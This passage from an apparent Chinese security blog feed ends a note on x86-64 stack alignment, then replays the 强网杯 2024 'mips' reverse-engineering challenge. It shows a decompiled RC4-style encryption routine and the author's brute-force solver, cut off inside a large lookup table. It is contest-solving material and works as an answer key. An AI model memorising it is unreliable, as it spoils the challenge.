它们分配内存将来可能会被SSE指令使用，所以必须是16字节对齐的，这也就形成了一种标准：</p><ul><li>任何内存分配函数（<code>alloca</code>, <code>malloc</code>, <code>calloc</code>或<code>realloc</code>）生成的块的起始地址都必须是16的倍数。</li><li>大多数函数的栈帧的边界都必须是16字节的倍数。</li></ul><p>如上，在运行时栈中，不仅传递的参数和局部变量要满足字节对齐，我们的栈指针（<code>rsp</code>）也必须是16的倍数。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> pwn </category>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强网杯2024复现</title>
      <link href="/posts/a234fc27.html"/>
      <url>/posts/a234fc27.html</url>
      
        <content type="html"><![CDATA[<p>这个题好难QAQ，整个比赛都是被打，我要裂开了</p><h2 id="mips">mips</h2><p>纯复现，这里先讲一下我的之前的做题流程</p><p>在代码中，是开辟了一块区域，然后放置加密后的代码，然后再解密，<br>可以直接dump然后修改，确实可以得到正确的输出</p><p>但是输出是假flag，所以它肯定修改了加密的内容，我尝试调试-g但是emu不允许调试，patch了也没用，然后我尝试使用了原本的qemu，倒是可以调试了，但是只能检测假flag。至此，大概能判断真flag在修改过的emu中。然后我尝试了bindiff，但是由于版本不对，有一堆不一样的不好找。</p><p>然后就看wp了，网上一位佬的做法：</p><p><a href="https://www.ctfiot.com/213409.html">强网杯 2024 初赛 Writeup | CTF导航</a></p><p>mmap函数分配的内存地址是固定的，也就是说如果要修改流程，那必然需要直接寻址，直接搜索立即数0x23000可以找到唯一一个调用它的函数</p><p>结果这个还没有调用</p><p>有花，去了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_33D48E</span><span class="params">(_BYTE *input)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v2; <span class="comment">// [rsp+15h] [rbp-17Bh]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-178h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-174h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [rsp+20h] [rbp-170h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+24h] [rbp-16Ch]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+28h] [rbp-168h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+2Ch] [rbp-164h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+30h] [rbp-160h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+34h] [rbp-15Ch]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+3Ch] [rbp-154h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *key1; <span class="comment">// [rsp+40h] [rbp-150h]</span></span><br><span class="line">  _BYTE *out; <span class="comment">// [rsp+48h] [rbp-148h]</span></span><br><span class="line">  _BYTE S[<span class="number">256</span>]; <span class="comment">// [rsp+80h] [rbp-110h] BYREF</span></span><br><span class="line">  __int16 v15; <span class="comment">// [rsp+180h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v16; <span class="comment">// [rsp+188h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v16 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(S, <span class="number">0</span>, <span class="keyword">sizeof</span>(S));</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i )</span><br><span class="line">    S[i] = i;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  key1 = <span class="string">&quot;6105t3&quot;</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v9 = (<span class="type">unsigned</span> __int8)S[v5];</span><br><span class="line">    v10 = (<span class="type">unsigned</span> __int8)(key1++)[(<span class="type">int</span>)(<span class="number">2</span> * (v5 / <span class="number">6</span> - (((<span class="number">2863311531u</span> * (<span class="type">unsigned</span> __int64)v5) &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xFFFFFFFC</span>)))];</span><br><span class="line">    v4 += v9 + v10;</span><br><span class="line">    v1 = v5++;</span><br><span class="line">    S[v1] = S[(<span class="type">unsigned</span> __int8)v4];</span><br><span class="line">    S[(<span class="type">unsigned</span> __int8)v4] = v9;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v5 != <span class="number">256</span> );</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  out = (_BYTE *)mallocLike(<span class="number">256LL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j != <span class="number">22</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = (<span class="type">unsigned</span> __int8)S[(<span class="type">unsigned</span> __int8)++v6];</span><br><span class="line">    v7 += v11;</span><br><span class="line">    S[(<span class="type">unsigned</span> __int8)v6] = S[(<span class="type">unsigned</span> __int8)v7];</span><br><span class="line">    S[(<span class="type">unsigned</span> __int8)v7] = v11;</span><br><span class="line">    v2 = ((((<span class="type">unsigned</span> __int8)(input[j + <span class="number">5</span>] &lt;&lt; <span class="number">7</span>) | (input[j + <span class="number">5</span>] &gt;&gt; <span class="number">1</span>)) &lt;&lt; <span class="number">6</span>) ^ <span class="number">0xC0</span> | ((<span class="type">unsigned</span> __int8)((input[j + <span class="number">5</span>] &lt;&lt; <span class="number">7</span>) | (input[j + <span class="number">5</span>] &gt;&gt; <span class="number">1</span>)) &gt;&gt; <span class="number">2</span>) ^ <span class="number">0x3B</span>) ^ <span class="number">0xBE</span>;</span><br><span class="line">    out[j] = S[(<span class="type">unsigned</span> __int8)(S[(<span class="type">unsigned</span> __int8)v6] + v11)] ^ key2[j &amp; <span class="number">3</span>] ^ (((<span class="type">unsigned</span> __int8)(((<span class="number">16</span> * (((<span class="number">32</span> * v2) | (v2 &gt;&gt; <span class="number">3</span>)) ^ <span class="number">0xAD</span>)) | ((<span class="type">unsigned</span> __int8)(((<span class="number">32</span> * v2) | (v2 &gt;&gt; <span class="number">3</span>)) ^ <span class="number">0xAD</span>) &gt;&gt; <span class="number">4</span>)) ^ <span class="number">0xDE</span>) &gt;&gt; <span class="number">5</span>) | (<span class="number">8</span> * (((<span class="number">16</span> * (((<span class="number">32</span> * v2) | (v2 &gt;&gt; <span class="number">3</span>)) ^ <span class="number">0xAD</span>)) | ((<span class="type">unsigned</span> __int8)(((<span class="number">32</span> * v2) | (v2 &gt;&gt; <span class="number">3</span>)) ^ <span class="number">0xAD</span>) &gt;&gt; <span class="number">4</span>)) ^ <span class="number">0xDE</span>)));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v16 != __readfsqword(<span class="number">0x28</span>u) )</span><br><span class="line">    sub_616930();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里很明显是加密函数</p><p>上面异或的地方用的是一个地址，但是不会调，找交叉引用发现模了255，那就爆破</p><p>像这种抽象的反编译的代码就直接抄吧QAQ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="type">int</span> v1; <span class="comment">// edx</span></span><br><span class="line"><span class="type">unsigned</span> __int8 v2; <span class="comment">// [rsp+15h] [rbp-17Bh]</span></span><br><span class="line"><span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-178h]</span></span><br><span class="line"><span class="type">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-174h]</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [rsp+20h] [rbp-170h]</span></span><br><span class="line"><span class="type">int</span> k; <span class="comment">// [rsp+24h] [rbp-16Ch]</span></span><br><span class="line"><span class="type">int</span> l; <span class="comment">// [rsp+28h] [rbp-168h]</span></span><br><span class="line"><span class="comment">//int j; // [rsp+2Ch] [rbp-164h]</span></span><br><span class="line"><span class="type">int</span> v9; <span class="comment">// [rsp+30h] [rbp-160h]</span></span><br><span class="line"><span class="type">int</span> v10; <span class="comment">// [rsp+34h] [rbp-15Ch]</span></span><br><span class="line"><span class="type">int</span> m; <span class="comment">// [rsp+3Ch] [rbp-154h]</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* key1; <span class="comment">// [rsp+40h] [rbp-150h]</span></span><br><span class="line">BYTE out[<span class="number">24</span>] = &#123; <span class="number">0</span> &#125;; <span class="comment">// [rsp+48h] [rbp-148h]</span></span><br><span class="line"><span class="comment">//BYTE S[256]; // [rsp+80h] [rbp-110h] BYREF</span></span><br><span class="line">BYTE Sbak[<span class="number">256</span>];</span><br><span class="line">BYTE Sbak2[<span class="number">256</span>];</span><br><span class="line">__int16 v15; <span class="comment">// [rsp+180h] [rbp-10h]</span></span><br><span class="line"><span class="type">unsigned</span> __int64 v16; <span class="comment">// [rsp+188h] [rbp-8h]</span></span><br><span class="line"><span class="type">char</span>* key = <span class="string">&quot;6105t3&quot;</span>;</span><br><span class="line"><span class="type">int</span> i_1 = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> S[<span class="number">256</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">S[i] = i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">key = <span class="string">&quot;6105t3&quot;</span>;</span><br><span class="line">v5 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v10 = (<span class="type">unsigned</span> __int8)S[i_1];</span><br><span class="line">BYTE v11 = (<span class="type">unsigned</span> __int8)(key++)[(<span class="type">int</span>)(<span class="number">2</span> * (i_1 / <span class="number">6</span> - (((<span class="number">0xAAAAAAAB</span> * (<span class="type">unsigned</span> __int64)i_1) &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xFFFFFFFC</span>)))];</span><br><span class="line">v5 += v10 + v11;</span><br><span class="line">v1 = i_1++;</span><br><span class="line">S[v1] = S[(<span class="type">unsigned</span> __int8)v5];</span><br><span class="line">S[(<span class="type">unsigned</span> __int8)v5] = v10;</span><br><span class="line">&#125; <span class="keyword">while</span> (i_1 != <span class="number">256</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> key2[<span class="number">4</span>] = &#123;</span><br><span class="line"><span class="number">0xDE</span>, <span class="number">0xAD</span>, <span class="number">0xBE</span>, <span class="number">0xEF</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">char</span> input[<span class="number">21</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> last[<span class="number">256</span>][<span class="number">24</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  &#123;<span class="number">0xc4</span>, <span class="number">0xee</span>, <span class="number">0x3c</span>, <span class="number">0xbb</span>, <span class="number">0xe7</span>, <span class="number">0xfd</span>, <span class="number">0x67</span>, <span class="number">0x9d</span>, <span class="number">0xf8</span>, <span class="number">0x97</span>, <span class="number">0x68</span>, <span class="number">0x1d</span>, <span class="number">0xdf</span>, <span class="number">0x7f</span>, <span class="number">0xc7</span>, <span class="number">0x80</span>, <span class="number">0x0b</span>, <span class="number">0xf9</span>, <span class="number">0x4b</span>, <span class="number">0xa0</span>, <span class="number">0x46</span>, <span class="number">0x91</span>&#125;,</span><br><span class="line">&#123; <span class="number">0xc5</span>, <span class="number">0xef</span>, <span class="number">0x3d</span>, <span class="number">0xba</span>, <span class="number">0xe6</span>, <span class="number">0xfc</span>, <span class="number">0x66</span>, <span class="number">0x9c</span>, <span class="number">0xf9</span>, <span class="number">0x96</span>, <span class="number">0x69</span>, <span class="number">0x1c</span>, <span class="number">0xde</span>, <span class="number">0x7e</span>, <span class="number">0xc6</span>, <span class="number">0x81</span>, <span class="number">0x0a</span>, <span class="number">0xf8</span>, <span class="number">0x4a</span>, <span class="number">0xa1</span>, <span class="number">0x47</span>, <span class="number">0x90</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xc6</span>, <span class="number">0xec</span>, <span class="number">0x3e</span>, <span class="number">0xb9</span>, <span class="number">0xe5</span>, <span class="number">0xff</span>, <span class="number">0x65</span>, <span class="number">0x9f</span>, <span class="number">0xfa</span>, <span class="number">0x95</span>, <span class="number">0x6a</span>, <span class="number">0x1f</span>, <span class="number">0xdd</span>, <span class="number">0x7d</span>, <span class="number">0xc5</span>, <span class="number">0x82</span>, <span class="number">0x09</span>, <span class="number">0xfb</span>, <span class="number">0x49</span>, <span class="number">0xa2</span>, <span class="number">0x44</span>, <span class="number">0x93</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xc7</span>, <span class="number">0xed</span>, <span class="number">0x3f</span>, <span class="number">0xb8</span>, <span class="number">0xe4</span>, <span class="number">0xfe</span>, <span class="number">0x64</span>, <span class="number">0x9e</span>, <span class="number">0xfb</span>, <span class="number">0x94</span>, <span class="number">0x6b</span>, <span class="number">0x1e</span>, <span class="number">0xdc</span>, <span class="number">0x7c</span>, <span class="number">0xc4</span>, <span class="number">0x83</span>, <span class="number">0x08</span>, <span class="number">0xfa</span>, <span class="number">0x48</span>, <span class="number">0xa3</span>, <span class="number">0x45</span>, <span class="number">0x92</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xc0</span>, <span class="number">0xea</span>, <span class="number">0x38</span>, <span class="number">0xbf</span>, <span class="number">0xe3</span>, <span class="number">0xf9</span>, <span class="number">0x63</span>, <span class="number">0x99</span>, <span class="number">0xfc</span>, <span class="number">0x93</span>, <span class="number">0x6c</span>, <span class="number">0x19</span>, <span class="number">0xdb</span>, <span class="number">0x7b</span>, <span class="number">0xc3</span>, <span class="number">0x84</span>, <span class="number">0x0f</span>, <span class="number">0xfd</span>, <span class="number">0x4f</span>, <span class="number">0xa4</span>, <span class="number">0x42</span>, <span class="number">0x95</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xc1</span>, <span class="number">0xeb</span>, <span class="number">0x39</span>, <span class="number">0xbe</span>, <span class="number">0xe2</span>, <span class="number">0xf8</span>, <span class="number">0x62</span>, <span class="number">0x98</span>, <span class="number">0xfd</span>, <span class="number">0x92</span>, <span class="number">0x6d</span>, <span class="number">0x18</span>, <span class="number">0xda</span>, <span class="number">0x7a</span>, <span class="number">0xc2</span>, <span class="number">0x85</span>, <span class="number">0x0e</span>, <span class="number">0xfc</span>, <span class="number">0x4e</span>, <span class="number">0xa5</span>, <span class="number">0x43</span>, <span class="number">0x94</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xc2</span>, <span class="number">0xe8</span>, <span class="number">0x3a</span>, <span class="number">0xbd</span>, <span class="number">0xe1</span>, <span class="number">0xfb</span>, <span class="number">0x61</span>, <span class="number">0x9b</span>, <span class="number">0xfe</span>, <span class="number">0x91</span>, <span class="number">0x6e</span>, <span class="number">0x1b</span>, <span class="number">0xd9</span>, <span class="number">0x79</span>, <span class="number">0xc1</span>, <span class="number">0x86</span>, <span class="number">0x0d</span>, <span class="number">0xff</span>, <span class="number">0x4d</span>, <span class="number">0xa6</span>, <span class="number">0x40</span>, <span class="number">0x97</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xc3</span>, <span class="number">0xe9</span>, <span class="number">0x3b</span>, <span class="number">0xbc</span>, <span class="number">0xe0</span>, <span class="number">0xfa</span>, <span class="number">0x60</span>, <span class="number">0x9a</span>, <span class="number">0xff</span>, <span class="number">0x90</span>, <span class="number">0x6f</span>, <span class="number">0x1a</span>, <span class="number">0xd8</span>, <span class="number">0x78</span>, <span class="number">0xc0</span>, <span class="number">0x87</span>, <span class="number">0x0c</span>, <span class="number">0xfe</span>, <span class="number">0x4c</span>, <span class="number">0xa7</span>, <span class="number">0x41</span>, <span class="number">0x96</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xcc</span>, <span class="number">0xe6</span>, <span class="number">0x34</span>, <span class="number">0xb3</span>, <span class="number">0xef</span>, <span class="number">0xf5</span>, <span class="number">0x6f</span>, <span class="number">0x95</span>, <span class="number">0xf0</span>, <span class="number">0x9f</span>, <span class="number">0x60</span>, <span class="number">0x15</span>, <span class="number">0xd7</span>, <span class="number">0x77</span>, <span class="number">0xcf</span>, <span class="number">0x88</span>, <span class="number">0x03</span>, <span class="number">0xf1</span>, <span class="number">0x43</span>, <span class="number">0xa8</span>, <span class="number">0x4e</span>, <span class="number">0x99</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xcd</span>, <span class="number">0xe7</span>, <span class="number">0x35</span>, <span class="number">0xb2</span>, <span class="number">0xee</span>, <span class="number">0xf4</span>, <span class="number">0x6e</span>, <span class="number">0x94</span>, <span class="number">0xf1</span>, <span class="number">0x9e</span>, <span class="number">0x61</span>, <span class="number">0x14</span>, <span class="number">0xd6</span>, <span class="number">0x76</span>, <span class="number">0xce</span>, <span class="number">0x89</span>, <span class="number">0x02</span>, <span class="number">0xf0</span>, <span class="number">0x42</span>, <span class="number">0xa9</span>, <span class="number">0x4f</span>, <span class="number">0x98</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xce</span>, <span class="number">0xe4</span>, <span class="number">0x36</span>, <span class="number">0xb1</span>, <span class="number">0xed</span>, <span class="number">0xf7</span>, <span class="number">0x6d</span>, <span class="number">0x97</span>, <span class="number">0xf2</span>, <span class="number">0x9d</span>, <span class="number">0x62</span>, <span class="number">0x17</span>, <span class="number">0xd5</span>, <span class="number">0x75</span>, <span class="number">0xcd</span>, <span class="number">0x8a</span>, <span class="number">0x01</span>, <span class="number">0xf3</span>, <span class="number">0x41</span>, <span class="number">0xaa</span>, <span class="number">0x4c</span>, <span class="number">0x9b</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xcf</span>, <span class="number">0xe5</span>, <span class="number">0x37</span>, <span class="number">0xb0</span>, <span class="number">0xec</span>, <span class="number">0xf6</span>, <span class="number">0x6c</span>, <span class="number">0x96</span>, <span class="number">0xf3</span>, <span class="number">0x9c</span>, <span class="number">0x63</span>, <span class="number">0x16</span>, <span class="number">0xd4</span>, <span class="number">0x74</span>, <span class="number">0xcc</span>, <span class="number">0x8b</span>, <span class="number">0x00</span>, <span class="number">0xf2</span>, <span class="number">0x40</span>, <span class="number">0xab</span>, <span class="number">0x4d</span>, <span class="number">0x9a</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xc8</span>, <span class="number">0xe2</span>, <span class="number">0x30</span>, <span class="number">0xb7</span>, <span class="number">0xeb</span>, <span class="number">0xf1</span>, <span class="number">0x6b</span>, <span class="number">0x91</span>, <span class="number">0xf4</span>, <span class="number">0x9b</span>, <span class="number">0x64</span>, <span class="number">0x11</span>, <span class="number">0xd3</span>, <span class="number">0x73</span>, <span class="number">0xcb</span>, <span class="number">0x8c</span>, <span class="number">0x07</span>, <span class="number">0xf5</span>, <span class="number">0x47</span>, <span class="number">0xac</span>, <span class="number">0x4a</span>, <span class="number">0x9d</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xc9</span>, <span class="number">0xe3</span>, <span class="number">0x31</span>, <span class="number">0xb6</span>, <span class="number">0xea</span>, <span class="number">0xf0</span>, <span class="number">0x6a</span>, <span class="number">0x90</span>, <span class="number">0xf5</span>, <span class="number">0x9a</span>, <span class="number">0x65</span>, <span class="number">0x10</span>, <span class="number">0xd2</span>, <span class="number">0x72</span>, <span class="number">0xca</span>, <span class="number">0x8d</span>, <span class="number">0x06</span>, <span class="number">0xf4</span>, <span class="number">0x46</span>, <span class="number">0xad</span>, <span class="number">0x4b</span>, <span class="number">0x9c</span> &#125;,</span><br><span class="line">&#123; <span class="number">0xca</span>, <span class="number">0xe0</span>, 